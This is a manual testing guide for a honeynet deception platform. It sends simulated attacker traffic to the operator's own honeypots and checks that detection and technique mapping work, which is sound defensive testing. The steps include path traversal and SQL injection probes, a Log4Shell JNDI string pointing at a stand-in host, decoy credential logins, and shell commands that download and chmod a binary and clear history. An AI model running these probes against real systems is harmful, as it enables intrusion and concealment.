# Attack Testing Guide

This guide is only for live/manual verification on the VM at `146.169.44.23`. Use host-facing browser or terminal traffic; avoid `docker run --network ...` for attacker traffic because it creates Docker bridge source IPs.

## 1. Start

```bash
./scripts/reset_enterprise_runtime.sh
./scripts/start_enterprise_stack.sh
```

Optional local tunnel for browser testing:

```bash
ssh -N \
  -L 127.0.0.1:18000:146.169.44.23:8080 \
  -L 127.0.0.1:18090:146.169.44.23:8090 \
  -L 127.0.0.1:18180:146.169.44.23:18080 \
  -L 127.0.0.1:18089:146.169.44.23:18081 \
  -L 127.0.0.1:18082:146.169.44.23:18082 \
  -L 127.0.0.1:18084:146.169.44.23:18084 \
  -L 127.0.0.1:18085:146.169.44.23:18085 \
  -L 127.0.0.1:18443:146.169.44.23:18443 \
  -L 127.0.0.1:19419:146.169.44.23:19418 \
  -L 127.0.0.1:13306:146.169.44.23:13306 \
  -L 127.0.0.1:16379:146.169.44.23:16379 \
  -L 127.0.0.1:12121:146.169.44.23:12121 \
  -L 127.0.0.1:12222:146.169.44.23:12222 \
  -L 127.0.0.1:12323:146.169.44.23:12323 \
  -L 127.0.0.1:12525:146.169.44.23:2525 \
  -L 127.0.0.1:11502:146.169.44.23:1502 \
  -L 127.0.0.1:11102:146.169.44.23:1102 \
  -L 127.0.0.1:11445:146.169.44.23:1445 \
  -L 127.0.0.1:11433:146.169.44.23:11433 \
  -L 127.0.0.1:12122:146.169.44.23:12122 \
  -L 127.0.0.1:19999:146.169.44.23:19999 \
  -L 127.0.0.1:10222:146.169.44.23:2222 \
  vm
```

Open browser pages with `127.0.0.1` instead of `localhost`, for example `http://127.0.0.1:18180/`, so the browser does not choose the IPv6 localhost path.

Quick health check:

```bash
curl -s "http://146.169.44.23:8090/api/summary" | jq '.chain_health[] | select(.stage == "Technique transition prior" or .stage == "Profile/controller" or .stage == "Gateway/assets")'
```

## 2. Public Signals

Run this from the same terminal/browser source IP that will later test internal ports:

```bash
curl -i "http://146.169.44.23:8080/"
curl -i "http://146.169.44.23:8080/.env.old"
curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt"
curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak"
curl -i "http://146.169.44.23:8080/assets/app.js.map"
curl -i "http://146.169.44.23:8080/admin"
curl -i "http://146.169.44.23:8080/.git/config"
curl -i "http://146.169.44.23:8080/phpinfo.php"
curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword"
curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201"
curl -i "http://146.169.44.23:8080/internal-api/status"
curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd"
curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D"
sleep 2
curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_entrypoint_observations: [.recent_entrypoint_observations[] | {attacker_key, path, matched_rules, indicators, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets}]}'
```

Expected: suspicious public paths have `matched_rules`, non-empty `profiler_evidence_ids`, and the attacker profile shows HTTP evidence.

## 3. Cowrie SSH Smoke

Connect to Cowrie:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23
```

Type these inside Cowrie:

```bash
whoami
id
uname -a
cat /etc/passwd
curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin
chmod +x /tmp/agent-update.bin
history -c
exit
```

Expected minimum mappings:

| Command | Expected technique |
| --- | --- |
| `whoami` | `T1033` |
| `id` | `T1033`, `T1087.001` |
| `uname -a` | `T1033`, `T1082` |
| `cat /etc/passwd` | `T1087.001` |
| `curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin` | `T1105` |
| `chmod +x /tmp/agent-update.bin` | `T1222.002` |
| `history -c` | `T1070.003` |

```bash
sleep 2
curl -s "http://146.169.44.23:8090/api/summary" | jq '{cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]}'
```

## 4. Unlock Fixed-Port MVP Assets

This is the manual test-mode path. It force-unlocks fixed-port MVP assets through the normal orchestrator API for the observed attacker key. High-interaction assets are validated separately because they need their runtime backend and telemetry forwarder to be reachable.

```bash
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"
echo "$TEST_ATTACKER_KEY"
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh
sleep 3
jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique' data/runtime/asset_gateway_routes.json
```

Expected: the route list includes `internal-portal`, `finance-share`, `git-internal`, `ops-db`, `redis-cache`, `web-admin-console`, `ftp-archive`, `ssh-canary`, `legacy-telnet`, `mail-relay`, `ics-plc`, `vpn-appliance`, and `malware-sink`. Extra naturally unlocked assets may also appear if the adaptive loop already acted.

## 5. Full Internal Smoke

Run this from the same source IP used above:

```bash
# static HTTP assets
curl -i "http://146.169.44.23:18080/" || true
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true
curl -i "http://146.169.44.23:18081/" || true
curl -i "http://146.169.44.23:18081/api/status" || true
curl -i "http://146.169.44.23:18082/" || true
curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true
curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true
curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true
curl -i "http://146.169.44.23:18084/" || true
curl -i "http://146.169.44.23:18084/config/plc-backup-2026-04.cfg" || true
curl -i "http://146.169.44.23:18443/" || true
curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true
curl -i "http://146.169.44.23:18085/" || true
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true
curl -i "http://146.169.44.23:18085/upload/README.txt" || true

# OpenCanary / protocol assets
timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true
printf "INFO\r\n" | nc -w 2 146.169.44.23 16379 || true
printf "KEYS *\r\n" | nc -w 2 146.169.44.23 16379 || true
printf "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc -w 3 146.169.44.23 12121 || true
timeout 8s ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 146.169.44.23 12323 || true
printf "EHLO tester\r\nVRFY admin\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 || true
python3 - <<'PY'
import socket
import struct

host = "146.169.44.23"
port = 13306
username = b"backup_reader"
password = b"WrongPassword"

try:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY
```

Check:

```bash
sleep 3
curl -s "http://146.169.44.23:8090/api/summary" | jq '{asset_gateway_routes, recent_opencanary_observations, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, internal_http_evidence, unlocked_assets}]}'
.venv/bin/python scripts/validation/asset_telemetry.py \
  --asset-id internal-portal \
  --asset-id finance-share \
  --asset-id git-internal \
  --asset-id ops-db \
  --asset-id redis-cache \
  --asset-id web-admin-console \
  --asset-id ftp-archive \
  --asset-id ssh-canary \
  --asset-id legacy-telnet \
  --asset-id mail-relay \
  --asset-id ics-plc \
  --asset-id vpn-appliance \
  --asset-id malware-sink \
  --require-observed
```

Expected: static HTTP assets produce internal HTTP evidence; Git/MySQL/Redis/FTP/SSH/Telnet/SMTP produce `recent_opencanary_observations` and update attacker tactics/techniques.

## 6. High-Interaction Runtime Smoke

Use this after the fixed-port smoke when you want to verify upgraded high-interaction backends. These commands force-unlock the Docker-backed high-interaction assets for the same attacker key, then probe their gateway-managed ports. Vulhub-backed `log4shell-app` and `spring-gateway-app` require an ignored `vendor/vulhub/` checkout and are not required for this smoke.

```bash
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh --assets conpot-plc,dionaea-capture,honeytrap-generic
sleep 10
jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip and (.asset_id == "conpot-plc" or .asset_id == "dionaea-capture" or .asset_id == "honeytrap-generic")) | {asset_id, public_port, backend_host, backend_port}]' data/runtime/asset_gateway_routes.json
```

Probe the high-interaction routes:

```bash
# Conpot HMI/ICS ports
curl -i "http://146.169.44.23:18084/" || true
printf "\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01" | nc -w 3 146.169.44.23 1502 || true
printf "\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x02\xc0\x01\x0a" | nc -w 3 146.169.44.23 1102 || true

# Dionaea HTTP/SMB/MSSQL/FTP-facing ports
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true
printf "\x00\x00\x00\x90" | nc -w 3 146.169.44.23 1445 || true
printf "\x12\x01\x00\x34" | nc -w 3 146.169.44.23 11433 || true
printf "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc -w 3 146.169.44.23 12122 || true

# Generic Honeytrap port
printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true
```

Check:

```bash
sleep 5
curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_high_interaction_observations, high_interaction_events: .event_counts.high_interaction, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, unlocked_assets}]}'
.venv/bin/python scripts/validation/asset_telemetry.py --asset-id conpot-plc --asset-id dionaea-capture --asset-id honeytrap-generic --require-observed
```

Expected: the three assets have runtime records, asset-gateway routes, dashboard running state, and either `recent_high_interaction_observations` or raw high-interaction/internal HTTP telemetry. If a third-party image is unavailable, the validation report should show the failed runtime instead of silently passing.

## 7. Debug

```bash
docker-compose -p honeynet -f docker-compose.control.yml ps
docker-compose -p honeynet -f docker-compose.enterprise.yml ps
docker logs --tail 50 honeynet_public-portal-forwarder_1
docker logs --tail 50 honeynet_internal-http-forwarder_1
docker logs --tail 50 honeynet_internal-protocol-forwarder_1
docker logs --tail 50 honeynet_opencanary-forwarder_1
docker logs --tail 50 honeynet_high-interaction-forwarder_1
tail -n 20 deploy/public-portal/logs/access.log
tail -n 20 data/runtime/internal_http_events.jsonl
tail -n 20 data/runtime/internal_protocol_events.jsonl
tail -n 20 data/runtime/high_interaction_events.jsonl
cat data/runtime/asset_gateway_routes.json | jq
```

## 8. Cleanup

```bash
./scripts/reset_enterprise_runtime.sh
```
